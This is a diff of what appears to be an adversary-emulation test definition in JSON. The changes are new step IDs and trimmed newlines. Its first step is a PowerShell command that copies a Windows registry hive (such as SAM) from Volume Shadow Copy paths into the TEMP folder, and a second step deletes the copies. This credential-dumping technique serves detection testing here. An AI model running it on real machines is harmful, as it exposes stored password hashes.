@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "f58294c7-13e4-411d-b858-2e66b555b5c2",
+      "id": "5af01c86-78d8-4d89-8e73-aac3e62cddab",
       "type": "execute-command",
       "data": {
-        "command": "1..#{limit} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n",
+        "command": "1..#{limit} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "15f3fb3c-9da8-44d6-b0f0-80c7bd38d35c",
+      "id": "f8abe967-aefc-4473-b87b-f9c0adbf42e8",
       "type": "execute-command",
       "data": {
-        "command": "1..#{limit} | % {\n  rm \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n",
+        "command": "1..#{limit} | % {\n  rm \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}",
         "command_type": "powershell"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "f58294c7-13e4-411d-b858-2e66b555b5c2",
+      "s": "5af01c86-78d8-4d89-8e73-aac3e62cddab",
       "p": "on-success",
-      "o": "15f3fb3c-9da8-44d6-b0f0-80c7bd38d35c"
+      "o": "f8abe967-aefc-4473-b87b-f9c0adbf42e8"
     },
     {
-      "s": "f58294c7-13e4-411d-b858-2e66b555b5c2",
+      "s": "5af01c86-78d8-4d89-8e73-aac3e62cddab",
       "p": "on-failure",
-      "o": "15f3fb3c-9da8-44d6-b0f0-80c7bd38d35c"
+      "o": "f8abe967-aefc-4473-b87b-f9c0adbf42e8"
     }
   ],
   "tags": [
